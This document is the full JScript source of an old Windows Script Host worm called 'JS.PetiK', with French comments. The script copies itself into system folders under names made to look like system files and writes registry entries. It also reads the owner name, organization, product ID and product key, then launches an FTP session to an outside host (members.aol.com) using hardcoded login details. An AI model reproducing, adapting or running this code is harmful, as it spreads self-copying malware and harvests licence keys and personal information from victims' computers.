// JS.PetiK par PetiK 28/04/2001
var WS=WScript.CreateObject("WScript.Shell")
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var win=fso.GetSpecialFolder(0)
var sys=fso.GetSpecialFolder(1)
var c=fso.OpenTextFile(WScript.ScriptFullName,1)
var file=c.ReadAll()

// Se copie dans le dossier WINDOWS\SAMPLES\WSH avec le nom Win32dll.js
var copie=fso.CreateTextFile(win+"\\SAMPLES\\WSH\\Win32dll.js",2)
copie.Write(file)
copie.Close()

// Se copie dans le dossier WINDOWS\SYSTEM avec le nom Kernel32.js
var copie2=fso.CreateTextFile(sys+"\\Kernel32.js",2)
copie2.Write(file)
copie2.Close()

// Ecrit dasn la base de registre
WS.RegWrite ("HKLM\\Software\\","JS.PetiK Par PetiK 28/04/2001");
WS.RegWrite ("HKCU\\Software\\","JS.PetiK Par PetiK 28/04/2001");

// Activation d'une boite de message
WS.Popup("JS.PetiK",2,"Petik vous présente")

// Prend des informations dans la Base de Registre
var nom=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner")
var org=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization")
var id=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId")
var key=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey")
var ver=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version")
var vernum=WS.RegRead ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber")
var txt=fso.CreateTextFile("C:\\"+nom+".txt",2)

// Création du fichier TXT : quelques informations du systême
txt.WriteLine ("Information de " + nom + " à " + org);
txt.WriteLine ("");
txt.WriteLine ("Numéro d'identification : " + id);
txt.WriteLine ("Numéro de la clé : " + key);
txt.WriteLine ("Version de windows : " + ver + " " + vernum);
txt.Close()

// Création du fichier BAT : activation de FTP
var bat=fso.CreateTextFile(win+"\\PetiK.bat",2)
bat.WriteLine ("@echo off");
bat.WriteLine ("start ftp -i -v -s:"+win+"\\PetiK.drv");
bat.Close()

// Création du fichier DRV : commandes FTP
var drv=fso.CreateTextFile(win+"\\PetiK.drv",2)
drv.WriteLine ("open");
drv.WriteLine ("members.aol.com");
drv.WriteLine ("pentasm99");
drv.WriteLine ("dragon");
drv.WriteLine ("cd JSPetiK");
drv.WriteLine ("get C:\\"+nom+".txt");
drv.WriteLine ("bye");
drv.WriteLine ("exit");
drv.Close()

// Création du fichier HTM : identification du ver
var start=WS.RegRead ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page")
var htm=fso.CreateTextFile(sys+"\\PetiK.htm",2)
htm.WriteLine ("<html><head><title>HTML.JS.PetiK</title>");
htm.WriteLine ("<body><IFRAME SRC='"+start+"'></IFRAME>");
htm.WriteLine ("<font face='verdana' color=#ff0000 size='2'>");
htm.WriteLine ("<br>Hi, you have my Worm.");
htm.WriteLine ("<br>It's not dangerous");
htm.WriteLine ("<br>Contact Symantec Corporation (www.symantec.com) to disinfect your computer");
htm.WriteLine ("</font>");
htm.WriteLine ("</body></html>");
htm.Close()

// Activation du fichier BAT
WS.Run (win+"\\PetiK.bat");